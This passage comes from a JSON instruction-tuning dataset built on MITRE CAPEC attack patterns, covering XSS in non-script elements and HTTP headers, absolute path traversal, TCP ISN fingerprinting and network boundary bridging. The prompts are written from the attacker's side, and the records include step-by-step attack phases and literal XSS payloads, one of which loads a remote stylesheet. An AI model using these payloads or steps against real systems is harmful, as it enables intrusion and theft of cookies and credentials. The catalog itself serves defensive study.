            "Design: Limit program privileges, so if commands circumvent program input validation or filter routines then commands do not running under a privileged account",
            "Implementation: Perform input validation for all remote content.",
            "Implementation: Use type conversions such as JDBC prepared statements."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "By appending special characters, such as a semicolon or other commands that are executed by the target process, the attacker is able to execute a wide variety of malicious commands in the target process space, utilizing the target's inherited permissions, against any resource the host has access to. The possibilities are vast including injection attacks against RDBMS (SQL Injection), directory servers (LDAP Injection), XML documents (XPath and XQuery Injection), and command line shells. In many injection attacks, the results are converted back to strings and displayed to the client process such as a web browser without tripping any security alarms, so the network firewall does not log any out of the ordinary behavior.",
              "LDAP servers house critical identity assets such as user, profile, password, and group information that is used to authenticate and authorize users. An attacker that can query the directory at will and execute custom commands against the directory server is literally working with the keys to the kingdom in many enterprises. When user, organizational units, and other directory objects are queried by building the query string directly from user input with no validation, or other conversion, then the attacker has the ability to use any LDAP commands to query, filter, list, and crawl against the LDAP server directly in the same manner as SQL injection gives the ability to the attacker to run SQL commands on the database."
            ]
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "146"
            },
            {
              "@CWE_ID": "77"
            },
            {
              "@CWE_ID": "184"
            },
            {
              "@CWE_ID": "78"
            },
            {
              "@CWE_ID": "185"
            },
            {
              "@CWE_ID": "93"
            },
            {
              "@CWE_ID": "140"
            },
            {
              "@CWE_ID": "157"
            },
            {
              "@CWE_ID": "138"
            },
            {
              "@CWE_ID": "154"
            },
            {
              "@CWE_ID": "697"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Description, Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: XSS Targeting Non-Script Elements (CAPEC ID: 18)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern XSS Targeting Non-Script Elements (CAPEC ID: 18):\nAbility to include malicious script in document, e.g. HTML file, or XML document. Ability to deploy a custom hostile service for access by targeted clients. Ability to communicate synchronously or asynchronously with client machine",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Ability to include malicious script in document, e.g. HTML file, or XML document. Ability to deploy a custom hostile service for access by targeted clients. Ability to communicate synchronously or asynchronously with client machine",
      "@Name": "XSS Targeting Non-Script Elements (CAPEC ID: 18)",
      "attack_ptrn": {
        "@ID": "18",
        "@Name": "XSS Targeting Non-Script Elements",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "This attack is a form of Cross-Site Scripting (XSS) where malicious scripts are embedded in elements that are not expected to host scripts such as image tags (<img>), comments in XML documents (< !-CDATA->), etc. These tags may not be subject to the same input validation, output validation, and other content filtering and checking routines, so this can create an opportunity for an adversary to tunnel through the application's elements and launch a XSS attack through other elements. As with all remote attacks, it is important to differentiate the ability to launch an attack (such as probing an internal network for unpatched servers) and the ability of the remote adversary to collect and interpret the output of said attack.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "591"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "592"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "588"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary records all entry points for inputs that happen to be reflected in a client-side non-script element. These non-script elements can be located in the HTML content (head, body, comments), in an HTML tag, XML, CSS, etc.",
              "Technique": [
                "Use a spidering tool to follow and record all non-static links that are likely to have input parameters (through forms, URL, fragments, etc.) actively used by the Web application.",
                "Use a proxy tool to record all links visited during a manual traversal of the web application.",
                "Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Probe identified potential entry points for XSS vulnerability] The adversary uses the entry points gathered in the \"Explore\" phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.",
              "Technique": [
                "Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side non-script elements context and observe system behavior to determine if script was executed. Since these probes may have to be injected in many different types of non-script elements, they should cover a variety of possible contexts (CSS, HTML tag, XML, etc.).",
                "Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side non-script elements context and observe system behavior to determine if script was executed. Since these probes may have to be injected in many different types of non-script elements, they should cover a variety of possible contexts (CSS, HTML tag, XML, etc.).",
                "Use a proxy tool to record results of the created requests."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Create malicious XSS content] Once the adversary has determined which entry points are vulnerable to XSS, they will interact with the web application to store the malicious content. Because of the nature of this attack, it is mostly carried out through stored XSS, although it is possible to perform this attack using reflected XSS. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from a victim.",
              "Technique": [
                "Store a malicious script on a page, disguised as a non-script element, that will execute when viewed by the victim.",
                "Use a tool such as BeEF to store a hook into the web application. This will alert the adversary when the victim has accessed the content and will give the adversary control over the victim's browser, allowing them access to cookies, user screenshot, user clipboard, and more complex XSS attacks."
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Get victim to view stored content] In order for the attack to be successful, the victim needs to view the stored malicious content on the webpage.",
              "Technique": [
                "Send a phishing email to the victim containing a URL that will direct them to the malicious stored content.",
                "Simply wait for a victim to view the content. This is viable in situations where content is posted to a popular public forum."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The target client software must allow the execution of scripts generated by remote hosts."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "To achieve a redirection and use of less trusted source, an adversary can simply edit content such as XML payload or HTML files that are sent to client machine."
            },
            {
              "@Level": "High",
              "#text": "Exploiting a client side vulnerability to inject malicious scripts into the browser's executable process."
            }
          ]
        },
        "Resources_Required": {
          "Resource": "Ability to include malicious script in document, e.g. HTML file, or XML document. Ability to deploy a custom hostile service for access by targeted clients. Ability to communicate synchronously or asynchronously with client machine"
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "In addition to the traditional input fields, all other user controllable inputs, such as image tags within messages or the likes, must also be subjected to input validation. Such validation should ensure that content that can be potentially interpreted as script by the browser is appropriately filtered.",
            "All output displayed to clients must be properly escaped. Escaping ensures that the browser interprets special scripting characters literally and not as script to be executed."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "An online discussion forum allows its members to post HTML-enabled messages, which can also include image tags. A malicious user embeds JavaScript in the IMG tags in their messages that gets executed within the victim's browser whenever the victim reads these messages.",
              "When executed within the victim's browser, the malicious script could accomplish a number of adversary objectives including stealing sensitive information such as usernames, passwords, or cookies."
            ],
            "xhtml:div": {
              "@style": "margin-left:1em;",
              "@class": "attack",
              "#text": "<img src=javascript:alert('XSS')>"
            }
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "80"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Examples-Instances, Related_Attack_Patterns, Related_Vulnerabilities, Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances, Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2017-05-01",
            "#text": "Embedding Scripts in Non-Script Elements"
          }
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: Absolute Path Traversal (CAPEC ID: 597)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern Absolute Path Traversal (CAPEC ID: 597):\nThe attacker must have access to an application interface or a direct shell that allows them to inject directory strings and monitor the results.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The attacker must have access to an application interface or a direct shell that allows them to inject directory strings and monitor the results.",
      "@Name": "Absolute Path Traversal (CAPEC ID: 597)",
      "attack_ptrn": {
        "@ID": "597",
        "@Name": "Absolute Path Traversal",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary with access to file system resources, either directly or via application logic, will use various file absolute paths and navigation mechanisms such as \"..\" to extend their range of access to inappropriate areas of the file system. The goal of the adversary is to access directories and files that are intended to be restricted from their access.",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "126"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Fingerprinting of the operating system] In order to perform a valid path traversal, the adversary needs to know what the underlying OS is so that the proper file seperator is used.",
              "Technique": [
                "Port mapping. Identify ports that the system is listening on, and attempt to identify inputs and protocol types on those ports.",
                "TCP/IP Fingerprinting. The adversary uses various software to make connections or partial connections and observe idiosyncratic responses from the operating system. Using those responses, they attempt to guess the actual operating system.",
                "Induce errors to find informative error messages"
              ]
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Survey application] Using manual or automated means, an adversary will survey the target application looking for all areas where user input is taken to specify a file name or path.",
              "Technique": [
                "Use a spidering tool to follow and record all links on a web page. Make special note of any links that include parameters in the URL.",
                "Use a proxy tool to record all links visited during a manual traversal of a web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.",
                "Use a browser to manually explore a website and analyze how it is constructed. Many browser's plug-in are available to facilitate the analysis or automate the URL discovery."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Attempt variations on input parameters] Using manual or automated means, an adversary attempts varying absolute file paths on all found user input locations and observes the responses.",
              "Technique": [
                "Access common files in root directories such as \"/bin\", \"/boot\", \"/lib\", or \"/home\"",
                "Access a specific drive letter or windows volume letter by specifying \"C:dirname\" for example",
                "Access a known Windows UNC share by specifying \"\\\\UNC\\share\\name\" for example"
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Access, modify, or execute arbitrary files.] An adversary injects absolute path traversal syntax into identified vulnerable inputs to cause inappropriate reading, writing or execution of files. An adversary could be able to read directories or files which they are normally not allowed to read. The adversary could also access data outside the web document root, or include scripts, source code and other kinds of files from external websites. Once the adversary accesses arbitrary files, they could also modify files. In particular situations, the adversary could also execute arbitrary code or system commands.",
              "Technique": [
                "Manipulate file and its path by injecting absolute path sequences (e.g. \"/home/file.txt\").",
                "Download files, modify files, or try to execute shell commands (with binary files)."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The target must leverage and access an underlying file system."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "Simple command line attacks."
            },
            {
              "@Level": "Medium",
              "#text": "Programming attacks."
            }
          ]
        },
        "Resources_Required": {
          "Resource": "The attacker must have access to an application interface or a direct shell that allows them to inject directory strings and monitor the results."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Integrity",
                "Confidentiality",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "The attacker may be able to create or overwrite critical files that are used to execute code, such as programs or libraries."
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data",
              "Note": "The attacker may be able to overwrite or create critical files, such as programs, libraries, or important data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, appending a new account at the end of a password file may allow an attacker to bypass authentication."
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data",
              "Note": "The attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, by reading a password file, the attacker could conduct brute force password guessing attacks in order to break into an account on the system."
            },
            {
              "Scope": "Availability",
              "Impact": "Unreliable Execution",
              "Note": "The attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the software from working at all and in the case of a protection mechanisms such as authentication, it has the potential to lockout every user of the software."
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Configure the access control correctly.",
            "Design: Enforce principle of least privilege.",
            "Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution.",
            "Design: Input validation. Assume that user inputs are malicious. Utilize strict type, character, and encoding enforcement.",
            "Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host.",
            "Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.",
            "Implementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin.",
            "Implementation: Perform input validation for all remote content, including remote and user-generated content.",
            "Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.",
            "Implementation: Use indirect references rather than actual file names.",
            "Implementation: Use possible permissions on file access when developing and deploying web applications.",
            "Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification using an allowlist approach."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "36"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2017-01-06"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Execution_Flow"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: XSS Through HTTP Headers (CAPEC ID: 86)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern XSS Through HTTP Headers (CAPEC ID: 86):\nThe adversary must have the ability to deploy a custom hostile service for access by targeted clients and the abbility to communicate synchronously or asynchronously with client machine. The adversary must also control a remote site of some sort to redirect client and data to.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary must have the ability to deploy a custom hostile service for access by targeted clients and the abbility to communicate synchronously or asynchronously with client machine. The adversary must also control a remote site of some sort to redirect client and data to.",
      "@Name": "XSS Through HTTP Headers (CAPEC ID: 86)",
      "attack_ptrn": {
        "@ID": "86",
        "@Name": "XSS Through HTTP Headers",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary exploits web applications that generate web content, such as links in a HTML page, based on unvalidated or improperly validated data submitted by other actors. XSS in HTTP Headers attacks target the HTTP headers which are hidden from most users and may not be validated by web applications.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "591"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "588"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "592"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey the application for public links] Using a browser or an automated tool, an adversary follows all public links on a web site. They record all the entry points (input) that becomes part of generated HTTP header (not only GET/POST/COOKIE, but also Content-Type, etc.)",
              "Technique": [
                "Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters used in the HTTP headers.",
                "Look for HTML meta tags that could be injectable",
                "Use a proxy tool to record all links visited during a manual traversal of the web application.",
                "Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": {
                "xhtml:p": [
                  "The adversary uses the entry points gathered in the \"Explore\" phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited. They record all the responses from the server that include unmodified versions of their script.",
                  "The adversary tries also to inject extra-parameter to the HTTP request to see if they are reflected back in the web page or in the HTTP response."
                ],
                "#text": "[Probe identified potential entry points for XSS vulnerability]"
              },
              "Technique": [
                "Manually inject various script payloads into each identified entry point using a list of common script injection probes and observe system behavior to determine if script was executed.",
                "Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes and observe system behavior to determine if script was executed.",
                "Use a proxy tool to record results of manual input of XSS probes in known URLs."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.",
              "Technique": [
                "Change a URL parameter which is used in an HTTP header to include a malicious script tag. Because it is in the header it may bypass validation.",
                "Send information gathered from the malicious script to a remote endpoint."
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.",
              "Technique": [
                "Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.",
                "Put the malicious URL on a public forum, where many victims might accidentally click the link."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Target software must be a client that allows scripting communication from remote hosts."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "To achieve a redirection and use of less trusted source, an adversary can simply edit HTTP Headers that are sent to client machine."
            },
            {
              "@Level": "High",
              "#text": "Exploiting a client side vulnerability to inject malicious scripts into the browser's executable process."
            }
          ]
        },
        "Resources_Required": {
          "Resource": "The adversary must have the ability to deploy a custom hostile service for access by targeted clients and the abbility to communicate synchronously or asynchronously with client machine. The adversary must also control a remote site of some sort to redirect client and data to."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Use browser technologies that do not allow client side scripting.",
            "Design: Utilize strict type, character, and encoding enforcement",
            "Design: Server side developers should not proxy content via XHR or other means, if a http proxy for remote content is setup on the server side, the client's browser has no way of discerning where the data is originating from.",
            "Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.",
            "Implementation: Perform input validation for all remote content.",
            "Implementation: Perform output validation for all remote content.",
            "Implementation: Disable scripting languages such as JavaScript in browser",
            "Implementation: Session tokens for specific host",
            "Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this."
          ]
        },
        "Example_Instances": {
          "Example": [
            {
              "xhtml:p": "Utilize a remote style sheet set in the HTTP header for XSS attack. When the adversary is able to point to a remote stylesheet, any of the variables set in that stylesheet are controllable on the client side by the remote adversary. Like most XSS attacks, results vary depending on browser that is used [REF-97].",
              "xhtml:div": {
                "@style": "margin-left:1em;",
                "@class": "attack",
                "#text": "<META HTTP-EQUIV=\"Link\" Content=\"<http://ha.ckers.org/xss.css>; REL=stylesheet\">"
              }
            },
            {
              "xhtml:p": [
                "Google's 404 redirection script was found vulnerable to this attack vector.",
                "Google's 404 file not found page read",
                "* Response headers: \"Content-Type: text/html; charset=[encoding]\".",
                "* Response body: <META http-equiv=\"Content-Type\" (...) charset=[encoding]/>",
                "If the response sends an unexpected encoding type such as UTF-7, then no enforcement is done on the payload and arbitrary XSS code will be transported along with the standard HTTP response. [REF-476]"
              ]
            },
            "XSS can be used in variety of ways, because it is scripted and executes in a distributed, asynchronous fashion it can create its own vector and openings. For example, the adversary can use XSS to mount a DDoS attack by having series of different computers unknowingly executing requests against a single host."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "80"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-1"
            },
            {
              "@External_Reference_ID": "REF-69",
              "@Section": "XSS Filter Evasion Cheat Sheet"
            },
            {
              "@External_Reference_ID": "REF-476"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Related_Weaknesses, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances, Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated References, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Example_Instances, Execution_Flow, Skills_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2017-05-01",
            "#text": "Embedding Script (XSS) in HTTP Headers"
          }
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: TCP (ISN) Greatest Common Divisor Probe (CAPEC ID: 322)",
    "context": "",
    "output": "The resources required to execute TCP (ISN) Greatest Common Divisor Probe (CAPEC ID: 322) are the following: A tool capable of sending and receiving packets from a remote system.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A tool capable of sending and receiving packets from a remote system.",
      "@Name": "TCP (ISN) Greatest Common Divisor Probe (CAPEC ID: 322)",
      "attack_ptrn": {
        "@ID": "322",
        "@Name": "TCP (ISN) Greatest Common Divisor Probe",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "This OS fingerprinting probe sends a number of TCP SYN packets to an open port of a remote machine. The Initial Sequence Number (ISN) in each of the SYN/ACK response packets is analyzed to determine the smallest number that the target host uses when incrementing sequence numbers. This information can be useful for identifying an operating system because particular operating systems and versions increment sequence numbers using different values. The result of the analysis is then compared against a database of OS behaviors to determine the OS type and/or version.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "312"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card."
        },
        "Resources_Required": {
          "Resource": "A tool capable of sending and receiving packets from a remote system."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Bypass Protection Mechanism",
                "Hide Activities"
              ]
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pg. 56"
            },
            {
              "@External_Reference_ID": "REF-128"
            },
            {
              "@External_Reference_ID": "REF-212",
              "@Section": "Chapter 8. Remote OS Detection"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Network Boundary Bridging (CAPEC ID: 700)",
    "context": "",
    "output": "required resources:\nThe adversary requires either high privileges or full control of a boundary device on a target network.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary requires either high privileges or full control of a boundary device on a target network.",
      "@Name": "Network Boundary Bridging (CAPEC ID: 700)",
      "attack_ptrn": {
        "@ID": "700",
        "@Name": "Network Boundary Bridging",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary which has gained elevated access to network boundary devices may use these devices to create a channel to bridge trusted and untrusted networks. Boundary devices do not necessarily have to be on the network\u2019s edge, but rather must serve to segment portions of the target network the adversary wishes to cross into.",
        "Extended_Description": {
          "xhtml:p": "Network boundary devices are network devices such as routers and firewalls which segment networks by restricting certain types of traffic from flowing through the device. Network boundary devices are often directly accessible through a portal page for management purposes. An adversary\u2019s goal when conducting network boundary bridging is to connect networks which are being segmented by the device. To do so, the adversary must first compromise the network boundary device."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "161"
            },
            {
              "@Nature": "CanFollow",
              "@CAPEC_ID": "70"
            },
            {
              "@Nature": "CanFollow",
              "@CAPEC_ID": "560"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify potential targets] An adversary identifies network boundary devices that can be compromised.",
              "Technique": "The adversary traces network traffic to identify which devices the traffic flows through. Additionally, the adversary can identify devices using fingerprinting methods or locating the management page to determine identifying information about the device."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Compromise targets] The adversary must compromise the identified targets in the previous step.",
              "Technique": [
                "Once the device is identified, the adversary can attempt to input known default credentials for the device to gain access to the management console.",
                "Adversaries with sufficient identifying knowledge about the target device can exploit known vulnerabilities in network devices to obtain administrative access."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Bridge Networks] The adversary changes the configuration of the compromised network device to connect the networks the device was segmenting. Depending on the type of network boundary device and its capabilities, bridging can be implemented using various methods.",
              "Technique": [
                "The adversary can abuse Network Address Translation (NAT) in firewalls and routers to manipulate traffic flow to their own design. With control of the network device, the adversary can manipulate NAT by either using existing configurations or creating their own to allow two previously unconnected networks to communicate.",
                "Some network devices can be configured to become a proxy server. Adversaries can set up or exploit an existing proxy server on compromised network devices to create a bridge between separate networks."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The adversary must have control of a network boundary device."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "The adversary must understand how to manage the target network device to create or edit policies which will bridge networks."
          }
        },
        "Resources_Required": {
          "Resource": "The adversary requires either high privileges or full control of a boundary device on a target network."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control"
